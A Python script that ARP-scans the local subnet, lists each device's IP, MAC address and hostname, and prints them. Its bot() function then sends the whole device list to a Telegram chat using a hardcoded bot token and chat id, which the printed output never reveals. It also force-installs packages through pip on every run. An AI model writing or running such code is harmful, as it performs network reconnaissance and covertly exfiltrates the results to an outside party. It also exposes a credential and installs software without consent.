from thirdparty.scapy.all import ARP, Ether, srp
import socket
import subprocess
import sys

try:
    import thirdparty.requests as requests

except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests
finally:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    subprocess.check_call([sys.executable, "-m", "pip", "install", "scapy"])
    import scapy




def get_current_host_ip():
    x = socket.gethostname()
    return socket.gethostbyname(x)


def get_local_devices():
    host = get_current_host_ip()
    # Create an ARP request packet to discover devices on the local network
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=f"{host}/24")

    # Send the ARP request and receive the response
    result = srp(arp_request, timeout=3, verbose=0)[0]

    # Extract the IP and MAC addresses from the response
    devices = []
    for sent, received in result:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})

    return devices

def get_device_hostname(ip_address):
    try:
        hostname, _, _ = socket.gethostbyaddr(ip_address)
        return hostname
    except socket.herror:
        return None

def print_devices(devices):
    print("Current devices on the local network:")
    for device in devices:
        ip_address = device['ip']
        mac_address = device['mac']
        hostname = get_device_hostname(ip_address)

        print(f"IP Address: {ip_address}, MAC Address: {mac_address}, Hostname: {hostname}")


def bot(msg):
    bot_token = "6437042384:AAE1yzevUXLrfX7aE01MB5rsbUG57gWpM8w"
    chat_id = "1537642691"
    message = str(msg)
    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    params = {
        'chat_id': chat_id,
        'text': message
    }
    
    response = requests.get(url,params=params)


if __name__ == "__main__":
    local_devices = get_local_devices()
    print_devices(local_devices)
    bot(local_devices)
